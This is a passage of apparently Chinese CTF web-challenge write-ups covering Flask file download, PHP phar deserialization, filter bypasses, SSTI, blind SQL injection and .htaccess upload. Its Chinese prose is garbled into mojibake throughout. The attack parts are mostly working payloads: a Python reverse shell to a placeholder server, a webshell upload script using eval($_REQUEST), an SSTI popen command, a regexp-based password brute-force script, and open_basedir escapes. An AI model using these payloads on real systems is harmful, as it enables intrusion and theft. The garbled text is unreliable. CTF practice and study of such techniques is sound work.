å›å»\n\n## [ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown\n\nPicDownï¼Œä¸‹è½½ç…§ç‰‡ï¼Œå°è¯•è®¿é—®/etc/passwdä¸‹è½½æˆåŠŸï¼Œçœ‹æ¥å¯ä»¥æ‰¾æ‰¾æºç ï¼Œæ²¡å•¥æ–‡ä»¶åŒ…å«æ€è·¯ï¼Œçœ‹wpï¼Œæ˜¯linuxçš„è¿›ç¨‹æ–‡ä»¶\n\n> å¯ä»¥é€šè¿‡/proc/pid/ æ¥ è· å– æŒ‡ å®š è¿› ç¨‹ çš„ ä¿¡ æ¯ ï¼Œ ä¾‹ å¦‚ å†… å­˜ æ˜  å°„ ã€ CPUç»‘ å®š ä¿¡ æ¯ ç­‰ ç­‰ ã€‚ å¦‚ æœ æŸ ä¸ª è¿› ç¨‹ æƒ³ è¦ è· å– æœ¬ è¿› ç¨‹ çš„ ç³» ç»Ÿ ä¿¡ æ¯ ï¼Œ å°± å¯ ä»¥ é€š è¿‡ è¿› ç¨‹ çš„pidæ¥ è®¿ é—® /proc/ pid/æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å†…å­˜æ˜ å°„ã€CPUç»‘å®šä¿¡æ¯ç­‰ç­‰ã€‚å¦‚æœæŸä¸ªè¿›ç¨‹æƒ³è¦è·å–æœ¬è¿›ç¨‹çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå°±å¯ä»¥é€šè¿‡è¿›ç¨‹çš„pidæ¥è®¿é—®/proc/pid/æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å†…å­˜æ˜ å°„ã€CPUç»‘å®šä¿¡æ¯ç­‰ç­‰ã€‚å¦‚æœæŸä¸ªè¿›ç¨‹æƒ³è¦è·å–æœ¬è¿›ç¨‹çš„ç³»ç»Ÿä¿¡æ¯ï¼Œå°±å¯ä»¥é€šè¿‡è¿›ç¨‹çš„pidæ¥è®¿é—®/proc/pid/ç›®å½•ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•è¿˜éœ€è¦è·å–è¿›ç¨‹pidï¼Œåœ¨forkã€daemonç­‰æƒ…å†µä¸‹pidè¿˜å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚ä¸ºäº†æ›´æ–¹ä¾¿çš„è·å–æœ¬è¿›ç¨‹çš„ä¿¡æ¯ï¼Œlinuxæä¾›äº†/proc/self/ç›®å½•ï¼Œè¿™ä¸ªç›®å½•æ¯”è¾ƒç‹¬ç‰¹ï¼Œä¸åŒçš„è¿›ç¨‹è®¿é—®è¯¥ç›®å½•æ—¶è·å¾—çš„ä¿¡æ¯æ˜¯ä¸åŒçš„ï¼Œå†…å®¹ç­‰ä»·äº/proc/æœ¬è¿›ç¨‹pid/ã€‚è¿›ç¨‹å¯ä»¥é€šè¿‡è®¿é—®/proc/self/ç›®å½•æ¥è·å–è‡ªå·±çš„ç³»ç»Ÿä¿¡æ¯ï¼Œè€Œä¸ç”¨æ¯æ¬¡éƒ½è·å–pidã€‚\n\nå…¶ä¸­çš„é‡è¦æ–‡ä»¶\n\n```\ncmdline\ncmdline æ–‡ä»¶å­˜å‚¨ç€å¯åŠ¨å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ï¼Œä½†åƒµå°¸è¿›ç¨‹ç›®å½•ä¸­çš„æ­¤æ–‡ä»¶ä¸åŒ…å«ä»»ä½•ä¿¡æ¯ã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹cmdlineç›®å½•è·å–å¯åŠ¨æŒ‡å®šè¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ï¼š\n\ncwd\ncwdæ–‡ä»¶æ˜¯ä¸€ä¸ªæŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œç›®å½•çš„ç¬¦å·é“¾æ¥ã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹cwdæ–‡ä»¶è·å–ç›®æ ‡æŒ‡å®šè¿›ç¨‹ç¯å¢ƒçš„è¿è¡Œç›®å½•\n\nenviron\nenvironæ–‡ä»¶å­˜å‚¨ç€å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡åˆ—è¡¨ï¼Œå½¼æ­¤é—´ç”¨ç©ºå­—ç¬¦ï¼ˆNULLï¼‰éš”å¼€ï¼Œå˜é‡ç”¨å¤§å†™å­—æ¯è¡¨ç¤ºï¼Œå…¶å€¼ç”¨å°å†™å­—æ¯è¡¨ç¤ºã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹environç›®å½•æ¥è·å–æŒ‡å®šè¿›ç¨‹çš„ç¯å¢ƒå˜é‡ä¿¡æ¯\n\nfd\nfdæ˜¯ä¸€ä¸ªç›®å½•ï¼Œé‡Œé¢åŒ…å«ç€å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„æè¿°ç¬¦ï¼ˆfile descriptorï¼‰å·®ä¸å¤šå°±æ˜¯è·¯å¾„å•¦ï¼Œè¿™äº›æ–‡ä»¶æè¿°ç¬¦æ˜¯æŒ‡å‘å®é™…æ–‡ä»¶çš„ä¸€ä¸ªç¬¦å·è¿æ¥ï¼Œå³æ¯ä¸ªé€šè¿‡è¿™ä¸ªè¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶éƒ½ä¼šæ˜¾ç¤ºåœ¨è¿™é‡Œã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡fdç›®å½•çš„æ–‡ä»¶è·å–è¿›ç¨‹ï¼Œä»è€Œæ‰“å¼€æ¯ä¸ªæ–‡ä»¶çš„è·¯å¾„ä»¥åŠæ–‡ä»¶å†…å®¹ã€‚\n```\n\nåˆ©ç”¨\n\n```\n1.è·å–å½“å‰å¯åŠ¨è¿›ç¨‹çš„å®Œæˆå‘½ä»¤ï¼š\ncat /proc/self/cmdline\n\n2.è·å–ç›®æ ‡å½“å‰è¿›ç¨‹çš„è¿è¡Œç›®å½•ä¸ç›®å½•é‡Œçš„æ–‡ä»¶ï¼š\nls -al /proc/self/cwd\nls /proc/self/cwd\n\n3.è·å¾—å½“å‰è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼š\nls -al /proc/self/exe\n\n3.è·å¾—å½“å‰è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼š\nls -al /proc/self/exe\n\n4.è·å–å½“å‰ç¯å¢ƒå˜é‡\ncat /proc/self/environ\n\n5.è·å–å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶å†…å®¹\ncat /proc/self/fd/{id}\nä¹Ÿå¯ä»¥æ˜¯ï¼š\ncat /proc/*/fd/*    --*å¯ä»¥ä»£æ›¿ä»»æ„æ•°å­—å’Œå­—æ¯\n```\n\næœ¬é¢˜ä¸­æˆ‘ä»¬å¯ä»¥è®¿é—®ä¸€ä¸‹è¿™å‡ ä¸ªä½ç½®\n\n```\ncmdline\npython2 app.py\n\nenviron\nMAIL=/var/mail/app\nUSER=app\nHOME=/home/app\nLOGNAME=app\nPATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games\nSHELL=/bin/sh\nPWD=/app\n```\n\nåœ¨è¿è¡Œä½ç½®æ‹¿åˆ°æºç \n\n```python\n#/proc/self/cwd/app.py\nfrom flask import Flask, Response\nfrom flask import render_template\nfrom flask import request\nimport os\nimport urllib\n\napp = Flask(__name__)\n\nSECRET_FILE = \"/tmp/secret.txt\"\nf = open(SECRET_FILE)\nSECRET_KEY = f.read().strip()\nos.remove(SECRET_FILE)\n\n\n@app.route('/')\ndef index():\n    return render_template('search.html')\n\n\n@app.route('/page')\ndef page():\n    url = request.args.get(\"url\")\n    try:\n        if not url.lower().startswith(\"file\"):\n            res = urllib.urlopen(url)\n            value = res.read()\n            response = Response(value, mimetype='application/octet-stream')\n            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'\n            return response\n        else:\n            value = \"HACK ERROR!\"\n    except:\n        value = \"SOMETHING WRONG!\"\n    return render_template('search.html', res=value)\n\n\n@app.route('/no_one_know_the_manager')\ndef manager():\n    key = request.args.get(\"key\")\n    print(SECRET_KEY)\n    if key == SECRET_KEY:\n        shell = request.args.get(\"shell\")\n        os.system(shell)\n        res = \"ok\"\n    else:\n        res = \"Wrong Key!\"\n\n    return res\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=8080)\n\n```\n\nå¯ä»¥çœ‹åˆ°ä»£ç ä¸­æ‰“å¼€äº†`/tmp/secret.txt`å¹¶ä¸”å°†å…¶ä¸­çš„å†…å®¹ä½œä¸ºSECRET_KEYï¼Œæ‰€ä»¥æˆ‘ä»¬è®¿é—®åˆ°è¿™ä¸ªæ–‡ä»¶å°±è¡Œäº†ï¼Œå°è¯•ç›´æ¥è¯»å–å‘ç°å¤±è´¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨procæ–‡ä»¶ä¸­çš„fdæ–‡ä»¶å¤¹ï¼Œidä»1å¼€å§‹å°è¯•ï¼Œæœ€ç»ˆå¯ä»¥æ‹¿åˆ°è¯¥æ–‡ä»¶\n\n```\nurl=/proc/self/fd/3\np3EtoNP0wO7DG6ZNhqzIT9dOV5sbSosf2GIQSXCkFqM=\n```\n\nå°è¯•ä¼ å‚ï¼ŒæˆåŠŸï¼Œä½†æ˜¯å‘½ä»¤æ‰§è¡ŒæˆåŠŸåå´æ²¡æœ‰å›æ˜¾ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯åå¼¹shellæˆ–è€…å†™æ–‡ä»¶\n\nåå¼¹shell\n\n```\npayload:\nkey=p3EtoNP0wO7DG6ZNhqzIT9dOV5sbSosf2GIQSXCkFqM=&shell=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"æœåŠ¡å™¨IPå–µå–µ\",ç›‘å¬ç«¯å£å–µå–µ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\n\n~~éªšæ“ä½œç›´æ¥è®¿é—®/flagä¸‹è½½æ–‡ä»¶~~\n\n## [SWPUCTF 2018]SimplePHP\n\næŸ¥çœ‹æ–‡ä»¶å¤„å¯ä»¥æŸ¥çœ‹é¡µé¢æºç \n\n```php\n//file.php\n<?php \nheader(\"content-type:text/html;charset=utf-8\");  \ninclude 'function.php'; \ninclude 'class.php'; \nini_set('open_basedir','/var/www/html/'); \n$file = $_GET[\"file\"] ? $_GET['file'] : \"\"; \nif(empty($file)) { \n    echo \"<h2>There is no file to show!<h2/>\"; \n} \n$show = new Show(); \nif(file_exists($file)) { \n    $show->source = $file; \n    $show->_show(); \n} else if (!empty($file)){ \n    die('file doesn\\'t exists.'); \n} \n?> \n```\n\n```php\n//class.php\n<?php\nclass C1e4r\n{\n    public $test;\n    public $str=new Show;\n    public function __construct($name)\n    {\n        $this->str = $name;\n    }\n    public function __destruct()\n    {\n        $this->test = $this->str;\n        echo $this->test;\n    }\n}\n\nclass Show\n{\n    public $source;\n    public $str['str']=new Test;\n    public function __construct($file)\n    {\n        $this->source = $file;   //$this->source = phar://phar.jpg\n        echo $this->source;\n    }\n    public function __toString()\n    {\n        $content = $this->str['str']->source;\n        return $content;\n    }\n    public function __set($key,$value)\n    {\n        $this->$key = $value;\n    }\n    public function _show()\n    {\n        if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this->source)) {\n            die('hacker!');\n        } else {\n            highlight_file($this->source);\n        }\n        \n    }\n    public function __wakeup()\n    {\n        if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker~\";\n            $this->source = \"index.php\";\n        }\n    }\n}\nclass Test\n{\n    public $file;\n    public $params['source']=\"/var/www/html/f1ag.php\";\n    public function __construct()\n    {\n        $this->params = array();\n    }\n    public function __get($key)\n    {\n        return $this->get($key);\n    }\n    public function get($key)\n    {\n        if(isset($this->params[$key])) {\n            $value = $this->params[$key];\n        } else {\n            $value = \"index.php\";\n        }\n        return $this->file_get($value);\n    }\n    public function file_get($value)\n    {\n        $text = base64_encode(file_get_contents($value));\n        return $text;\n    }\n}\n?>\n```\n\n```php\n//function.php\n<?php \n//show_source(__FILE__); \ninclude \"base.php\"; \nheader(\"Content-type: text/html;charset=utf-8\"); \nerror_reporting(0); \nfunction upload_file_do() { \n    global $_FILES; \n    $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; \n    //mkdir(\"upload\",0777); \n    if(file_exists(\"upload/\" . $filename)) { \n        unlink($filename); \n    } \n    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); \n    echo '<script type=\"text/javascript\">alert(\"ä¸Šä¼ æˆåŠŸ!\");</script>'; \n} \nfunction upload_file() { \n    global $_FILES; \n    if(upload_file_check()) { \n        upload_file_do(); \n    } \n} \nfunction upload_file_check() { \n    global $_FILES; \n    $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); \n    $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); \n    $extension = end($temp); \n    if(empty($extension)) { \n        //echo \"<h4>è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:\" . \"<h4/>\"; \n    } \n    else{ \n        if(in_array($extension,$allowed_types)) { \n            return true; \n        } \n        else { \n            echo '<script type=\"text/javascript\">alert(\"Invalid file!\");</script>'; \n            return false; \n        } \n    } \n} \n?> \n```\n\nååºåˆ—åŒ–æ‰¾é“¾å­å¾ˆæ˜æ˜¾äº†\n\n```\nC1e4r::__destruct->Show::__toString->Test::__get->Test::get->Test::file_get\n```\n\næ„é€ ååºåˆ—åŒ–\n\n```php\n<?php\nclass C1e4r\n{\n    public $test;\n    public $str;\n}\n\nclass Show\n{\n    public $source;\n    public $str;\n}\nclass Test\n{\n    public $file;\n    public $params;\n}\n\n$a = new C1e4r();\n$b = new Show();\n$a->str = $b;\n$c = new Test();\n$c->params['source'] = \"/var/www/html/f1ag.php\";//ç›®æ ‡æ–‡ä»¶\n$b->str['str'] = $c;  //è§¦å‘__get;\n\n\n$phar = new Phar(\"exp.phar\"); //ç”Ÿæˆpharæ–‡ä»¶\n$phar->startBuffering();\n$phar->setStub('<?php __HALT_COMPILER(); ? >');\n$phar->setMetadata($a); //è§¦å‘ç±»æ˜¯C1e4rç±»\n$phar->addFromString(\"text.txt\", \"test\"); //ç­¾å\n$phar->stopBuffering();\n\n?>\n```\n\npharè®¿é—®å³å¯\n\n## [çº¢æ˜è°·CTF 2021]write_shell\n\n```\nif(preg_match(\"/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i\",$input)){\n\tdie('hacker!!!');\n```\n\nçœ‹çœ‹éƒ½è¿‡æ»¤äº†å•¥\n\nç©ºæ ¼ï¼Œä¸‹åˆ’çº¿ï¼Œphpï¼Œåˆ†å·ï¼Œ~ï¼Œ^ï¼Œ+ï¼Œevalï¼ŒèŠ±æ‹¬å·\n\né¦–å…ˆæ˜¯phpæ ‡ç­¾ç»•è¿‡ï¼Œæœ‰çŸ­æ ‡ç­¾\n\n```\n<?=`å‘½ä»¤`?>\n<?echo\"1\"?>\n<% echo\"1\";%>\n```\n\nä½¿ç”¨ç¬¬ä¸€ä¸ªæ¥æ‰§è¡Œå‘½ä»¤ï¼Œç„¶åå°±æ˜¯ç©ºæ ¼ï¼Œç”¨åˆ¶è¡¨ç¬¦%09ä»£æ›¿ï¼Œæ ¹ç›®å½•è¯»å–å³å¯\n\n```\npayload:data=<?=`cat%09/flllllll1112222222lag`?>\n```\n\n## [HarekazeCTF2019]encode_and_encode\n\n```php\n<?php\nerror_reporting(0);\n\nif (isset($_GET['source'])) {\n  show_source(__FILE__);\n  exit();\n}\n\nfunction is_valid($str) {\n  $banword = [\n    // no path traversal\n    '\\.\\.',\n    // no stream wrapper\n    '(php|file|glob|data|tp|zip|zlib|phar):',\n    // no data exfiltration\n    'flag'\n  ];\n  $regexp = '/' . implode('|', $banword) . '/i';\n  if (preg_match($regexp, $str)) {\n    return false;\n  }\n  return true;\n}\n\n$body = file_get_contents('php://input');\n$json = json_decode($body, true);\n\nif (is_valid($body) && isset($json) && isset($json['page'])) {\n  $page = $json['page'];\n  $content = file_get_contents($page);\n  if (!$content || !is_valid($content)) {\n    $content = \"<p>not found</p>\\n\";\n  }\n} else {\n  $content = '<p>invalid request</p>';\n}\n\n// no data exfiltration!!!\n$content = preg_replace('/HarekazeCTF\\{.+\\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);\necho json_encode(['content' => $content]);\n```\n\næˆ‘çœŸç»•ä¸è¿‡å»å•Šï¼Œwp\n\n> jsonå­—ç¬¦è½¬è¯‘ï¼Œjsonä¼šå°†utf-8ç¼–ç çš„å­—ç¬¦è‡ªåŠ¨è½¬ä¸ºåŸå§‹å­—ç¬¦\n\nè¿™å°±å¥½åŠäº†ï¼Œç›´æ¥å°†æƒ³è¯»å–å†…å®¹ä¸­çš„flagè¿›è¡Œutf-8ç¼–ç å³å¯ï¼Œåˆå› ä¸ºä¸‹é¢å¯¹åŒ¹é…flagçš„å­—ç¬¦ä¸²è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ‰€ä»¥ä½¿ç”¨ä¼ªåè®®è¯»å–\n\n```\npayload:\nPOST\n{\"page\":\"\\u0070\\u0068\\u0070://filter/convert.base64-encode/resource=/\\u0066\\u006c\\u0061\\u0067\"}\n```\n\n## [RootersCTF2019]I_<3_Flask\n\nSSTIå¾ˆæ˜æ˜¾äº†ï¼Œå°±æ˜¯è¿™ä¸ªä¼ å‚ä¸å¥½æ‰¾ï¼Œç”¨ä¸ªè„šæœ¬Arjunç”¨æ¥çˆ†å‚æ•°çš„\n\n```\nname={{url_for.__globals__[\"os\"].popen('cat flag.txt').read()}}\n```\n\n## [NCTF2019]SQLi\n\nè´´å¿ƒçš„æç¤ºï¼Œbançš„å¯çœŸå¤š\n\n```\n$black_list = \"/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\\'|=| |in|<|>|-|\\.|\\(\\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i\";\n\n\nIf $_POST['passwd'] === admin's password,Then you will get the flag;\n```\n\næ‰€æœ‰çš„æ³¨é‡Šéƒ½æ²¡äº†ï¼ŒPHPç‰ˆæœ¬åˆ<5.3.4ï¼Œä½¿ç”¨00æˆªæ–­æ¥è£åˆ‡åé¢è¯­å¥ï¼Œæ„é€ payload\n\n```mysql\nusername=\\&passwd=||(passwd/**/regexp/**/\"^y\");%00\næ„é€ å‡ºçš„è¯­å¥å°±æ˜¯\nselect * from users where username='\\' and passwd='||(passwd/**/regexp/**/\"^w\");%00'\n```\n\n```python\nimport requests\nimport time\nfrom urllib import parse\nurl=\"http://9ae4f74d-f7fe-4d73-8116-90698fc3d9d0.node4.buuoj.cn:81/index.php\"\nname=\"qwertyuiopasdfghjklzxcvbnm_}{0123456789\"\nflag=\"\"\nfor i in range(1,100):\n    for j in name:\n        tmp=flag+j\n        data={'username':'\\\\',\n            'passwd':f\"||(passwd/**/regexp/**/\\\"^{tmp}\\\");{parse.unquote('%00')}\"\n        }\n        co=requests.post(url=url,data=data).status_code\n        if co==404:\n            flag=tmp\n            print(j,end=\"\")\n#you_will_never_know7788990\n```\n\nè„šæœ¬æ‹¿åˆ°passwordï¼Œå†éšä¾¿å†™ä¸€ä¸ªé™¤adminä¹‹å¤–çš„userå°±è¡Œ\n\n## [SUCTF 2019]EasyWeb\n\n```php\n<?php\nfunction get_the_flag(){\n    // webadmin will remove your upload file every 20 min!!!! \n    $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']);\n    if(!file_exists($userdir)){\n    mkdir($userdir);\n    }\n    if(!empty($_FILES[\"file\"])){\n        $tmp_name = $_FILES[\"file\"][\"tmp_name\"];\n        $name = $_FILES[\"file\"][\"name\"];\n        $extension = substr($name, strrpos($name,\".\")+1);\n    if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); \n        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die(\"^_^\");\n    if(!exif_imagetype($tmp_name)) die(\"^_^\"); \n        $path= $userdir.\"/\".$name;\n        @move_uploaded_file($tmp_name, $path);\n        print_r($path);\n    }\n}\n\n$hhh = @$_GET['_'];\n\nif (!$hhh){\n    highlight_file(__FILE__);\n}\n\nif(strlen($hhh)>18){\n    die('One inch long, one inch strong!');\n}\n\nif ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&.,|=[\\x7F]+/i', $hhh) )\n    die('Try something else!');\n\n$character_type = count_chars($hhh, 3);\nif(strlen($character_type)>12) die(\"Almost there!\");\n\neval($hhh);\n?>\n```\n\nçœ‹ä»£ç ï¼Œåº”è¯¥æ˜¯è®©æˆ‘ä»¬æ‰§è¡Œ`get_the_flag`å‡½æ•°å†ä¸Šä¼ æ–‡ä»¶getshell\n\né¦–å…ˆæ˜¯[æ­£åˆ™ç»•è¿‡](https://blog.csdn.net/mochu7777777/article/details/104631142)ï¼Œä½¿ç”¨å¼‚æˆ–ç»•è¿‡\n\n```\n?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=get_the_flag\n```\n\nä¸‹ä¸€æ­¥å°±æ˜¯èµ°æ–‡ä»¶å†…å®¹è¿‡æ»¤ç»•è¿‡äº†\n\né¦–å…ˆè¿‡äº†æ–‡ä»¶å¸¦phåç¼€ï¼Œç„¶åæ£€æŸ¥æ–‡ä»¶ä¸­æœ‰æ²¡æœ‰<?ï¼Œæœ€åé€šè¿‡`exif_imagetype`çœ‹çœ‹æ˜¯ä¸æ˜¯å›¾ç‰‡\n\næ‰€æœ‰phpç±»å‹æ–‡ä»¶æƒ³éƒ½ä¸è¦æƒ³äº†ï¼Œç”¨.htaccessï¼Œä½†æ˜¯å¦‚æœç›´æ¥æ·»åŠ å¹»æ•°å¤´ä¼šå¯¼è‡´æ•´ä¸ªæ–‡ä»¶ä¸è¢«è§£æï¼Œæ‰€ä»¥æ–°çŸ¥è¯†æ¥è¾£\n\n> exif_imagetype()å‡½æ•°æ˜¯PHPä¸­çš„å†…ç½®å‡½æ•°ï¼Œç”¨äºç¡®å®šå›¾åƒçš„ç±»å‹ã€‚\n>\n> **ç”¨æ³•:**\n>\n> ```\n> int exif_imagetype( string $filename )\n> ```\n>\n> **å‚æ•°ï¼š**è¯¥å‡½æ•°æ¥å—å•ä¸ªå‚æ•°$filenameï¼Œè¯¥å‚æ•°ä¿å­˜å›¾åƒçš„åç§°æˆ–URLã€‚\n>\n> **è¿”å›å€¼ï¼š**æ­¤å‡½æ•°è¿”å›ä¸IMAGETYPEå¸¸é‡ä¹‹ä¸€ç›¸å¯¹åº”çš„æ•´æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n>\n> - IMAGETYPE_GIF(1)\n> - IMAGETYPE_JPEG(2)\n> - IMAGETYPE_PNG(3)\n> - IMAGETYPE_SWF(4)\n> - IMAGETYPE_PSD(5)\n> - IMAGETYPE_BMP(6)\n> - IMAGETYPE_TIFF_II(7)\n> - IMAGETYPE_TIFF_MM(8)\n> - IMAGETYPE_JPC(9)\n> - IMAGETYPE_JP2(10)\n> - IMAGETYPE_JPX(11)\n> - IMAGETYPE_JB2(12)\n> - IMAGETYPE_SWC(13)\n> - IMAGETYPE_IFF(14)\n> - IMAGETYPE_WBMP(15)\n> - IMAGETYPE_XBM(16)\n> - IMAGETYPE_ICO(17)\n> - IMAGETYPE_WEBP(18)\n\nåªæœ‰å½“æ–‡ä»¶å†…å®¹ä¸å±äºä»¥ä¸Šä»»ä½•ä¸€ç§å›¾ç‰‡ç±»å‹çš„æ—¶å€™æ‰ä¼šè¿”å›FALSE\n\nè€Œåœ¨.htaccessä¸­æœ‰ä¸¤ä¸ªæ³¨é‡Šç¬¦å·\n\n```\n\\x00\n#\n```\n\næ°å·§åœ¨å›¾ç‰‡ä¸­å°±æœ‰ä¸¤ç§ç±»å‹çš„å›¾ç‰‡æ˜¯æœ‰è¿™æ ·å¼€å¤´çš„å†…å®¹çš„\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-09 23.51.41.png)\n\n> \\x00\\x00\\x85\\x85 åªèƒ½æ”¾åœ¨æ–‡ä»¶å¼€å¤´ä½ç½®\n\n> \\#define width 1337\n> \\#define height 1337\n> å¯ä»¥æ”¾åœ¨æ–‡ä»¶ä»»æ„ä½ç½®\n\næ³¨æ„å¥½è¿™ä¸ªå°±å¯ä»¥ä¸Šä¼ æˆåŠŸ.htaccessæ–‡ä»¶å•¦\n\nä¸‹é¢æƒ³æƒ³æœ¨é©¬å¦‚ä½•æ„é€ ï¼Œç”±äºå¯¹å†…å®¹ä¸­çš„æ ‡ç­¾<?è¿›è¡Œäº†è¿‡æ»¤ï¼Œæ‰€ä»¥æ˜¯ä¸èƒ½ä½¿ç”¨ä»»ä½•å·²çŸ¥çš„çŸ­æ ‡ç­¾ç»•è¿‡æ–¹æ³•è¿›è¡Œç»•è¿‡çš„ï¼Œå¹¶ä¸”åœ¨è¿™ä¸ªç‰ˆæœ¬çš„PHPä¸­ï¼Œç±»ä¼¼äº`<script language=\"php\">`è¿™æ ·çš„æ ‡ç­¾ä¹Ÿæ˜¯ä¸ç”Ÿæ•ˆçš„ï¼Œéªšæ“ä½œæ¥äº†ï¼Œä½¿ç”¨phpä¼ªåè®®ç”¨base64ç»•è¿‡ï¼Œæ„é€ å†…å®¹æ—¶åœ¨.htaccessä¸­æ·»åŠ ä¼ªåè®®ï¼Œæœ€ç»ˆæ„é€ å‡ºçš„shellå’Œ.htaccessæ–‡ä»¶å¦‚ä¸‹\n\n```\n.htaccess\n#define width 1000\n#define height 1000\nAddType application/x-httpd-php .kkk\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/kk.kkk\"\n```\n\n```python\nimport requests\nimport base64\nhta=b'''\n#define width 1000\n#define height 1000\nAddType application/x-httpd-php .kkk\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/kk.kkk\"\n'''\nhta={'file':('.htaccess',hta,\"image/png\")}\nurl=\"http://42c1f3d3-4023-4a55-822e-532aa2640e28.node4.buuoj.cn:81/?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=get_the_flag\"\nres=requests.post(url=url,files=hta).text\nprint(res)\nshell = b\"GIF89aaa\" + base64.b64encode(b\"<?php eval($_REQUEST['kkk']);?>\")\nshe={'file':('kk.kkk',shell,\"image/png\")}\nres=requests.post(url=url,files=she).text\nprint(res)\n```\n\nä¸Šä¼ å¹¶è®¿é—®ï¼ŒæˆåŠŸ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-10 00.09.32.png)\n\nå¯ä»¥çœ‹åˆ°ç¦ç”¨äº†å·¨å¤šçš„å‡½æ•°ï¼Œ~~å…¶å®è¿™é‡Œæœç´¢flagå°±èƒ½ç›´æ¥æ‹¿åˆ°flagäº†~~ï¼Œä¸èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œopen_basediråˆè¢«é™åˆ¶äº†ï¼Œå°è¯•[ç»•è¿‡](https://xz.aliyun.com/t/4720)\n\n```\npayload:\nkkk=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));\n```\n\nç„¶åæ‹¿flag\n\n```\npayload:\nkkk=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/THis_Is_tHe_F14g');\n```\n\n## [NPUCTF2020]ezinclude\n\né¦–å…ˆçœ‹æºç æç¤ºï¼Œæç¤ºäº†passå†…å®¹ï¼Œå†çœ‹å“åº”å¤´ä¸­çš„Hashï¼Œç›´æ¥ä¼ å…¥ï¼Œè·³è½¬flflflflag.phpçœ‹å†…å®¹ä¸­æœ‰ä¸ªincludeï¼Œè¯»å–ä¸€æŠŠæºç \n\n```php\n<?php\n$file=$_GET['file'];\nif(preg_match('/data|input|zip/is',$file)){\n\tdie('nonono');\n}\n@include($file);\necho 'include($_GET[\"file\"])';\n?>\n```\n\nè¿‡æ»¤äº†dataï¼Œinputï¼Œzip\n\næ–°çŸ¥è¯†\n\n> å¯ä»¥åˆ©ç”¨\n>\n> php://filter/string.strip_tags\n>\n> å¯¼è‡´phpå´©æºƒï¼ŒåŒæ—¶å¯ä¸Šä¼ æ–‡ä»¶ä¿å­˜åœ¨/tmpç›®å½•æ¥ä¸Šä¼ æœ¨é©¬ã€‚\n>\n> åˆ©ç”¨æ¡ä»¶ï¼š\n>\n> - php7.0.0-7.1.2å¯ä»¥åˆ©ç”¨ï¼Œ 7.1.2xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤\n> - php7.1.3-7.2.1å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.1xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤\n> - php7.2.2-7.2.8å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.9ä¸€ç›´åˆ°7.3åˆ°ç°åœ¨çš„ç‰ˆæœ¬å·²è¢«ä¿®å¤\n> - å¯ä»¥è·å–æ–‡ä»¶å\n> - æºä»£ç 